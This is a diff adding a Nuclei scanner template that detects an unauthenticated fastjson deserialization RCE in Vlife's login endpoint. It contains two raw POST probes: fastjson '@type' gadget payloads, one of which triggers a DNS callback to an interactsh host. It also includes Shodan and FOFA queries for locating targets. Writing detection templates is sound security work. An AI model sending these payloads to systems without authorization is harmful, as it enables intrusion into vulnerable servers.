@@ -1,0 +1,63 @@
+id: vlife-fastjson-rce
+
+info:
+  name: Vlife FastJSON - Remote Code Execution
+  author: omarkurt
+  severity: critical
+  description: |
+    alibaba/fastjson v1.2.67 within the MyUsernamePasswordAuthenticationFilter for processing authentication requests. The /vlife/login endpoint directly deserializes the raw HTTP request body using JSON.parseObject() without enforcing type restrictions or enabling safe mode, allowing unauthenticated attackers to exploit known fastjson gadget chains for Remote Code Execution.
+  reference:
+    - https://securitylab.github.com/advisories/GHSL-2024-300_wwwlike_vlife/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-502
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: vlife
+    product: vlife
+    shodan-query: http.title:"vlife"
+    fofa-query: http.title:"vlife"
+  tags: vlife,fastjson,rce,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /vlife/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"@type":"java.lang.Runtime"}
+
+    matchers:
+      - type: dsl
+        name: eid
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(body, "com.alibaba.fastjson.JSONException", "autoType is not support", "java.lang.Runtime")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /vlife/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"@type":"java.net.Inet4Address","val":"{{interactsh-url}}"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: word
+        part: body
+        words:
+          - "com.alibaba.fastjson.JSONException"
+# digest: 490a0046304402206aeb91f5b9faccf30a48fcf218559e7161e009999a00b7839d609fd54155612d022058664157d4d9b8ddb911a04903b165e7b3735fece15bd0e6e96ac558c71a2da5:922c64590222798bb761d5b6d8e72950
